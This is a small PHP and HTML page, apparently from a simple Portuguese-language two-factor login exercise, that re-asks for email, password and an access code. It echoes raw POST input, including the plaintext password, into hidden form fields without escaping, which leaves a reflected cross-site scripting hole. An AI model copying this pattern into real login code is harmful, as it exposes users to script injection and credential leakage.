<?php

$email = $_POST['email'];
$senha = $_POST['senha'];
$token = $_POST['codigo'];

//var_dump($email,$senha,$token);
?>

<!DOCTYPE html>
<html lang="pt-br">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="main.css">
    <title>Auth2f</title>
</head>

<body>
    <div class="container">

        <div class="formulario form-group">
            <h1>Confirmação de Segurança</h1>
            <form action="confirmacao.php" method="POST">

                <label for="email" class="form-label">Confirme seu Email</label>

                <input type="email" name="conemail" class="form-input">

                <label for="email" class="form-label">Confirme sua senha</label>

                <input type="password" name="consenha" class="form-input">

                <label class="form-label" for="codigo">Digite o código de acesso</label>

                <input class="form-input" type="text" id="codigo" name="codigo">

                <input type="hidden" id="token" name="token" value="<?php echo $token; ?>">
                <input type="hidden" id="token" name="email" value="<?php echo $email; ?>">
                <input type="hidden" id="token" name="senha" value="<?php echo $senha; ?>">

                <button class="btn btn-primary">Acessar</button>
            </form>

        </div>
    </div>


</body>

</html>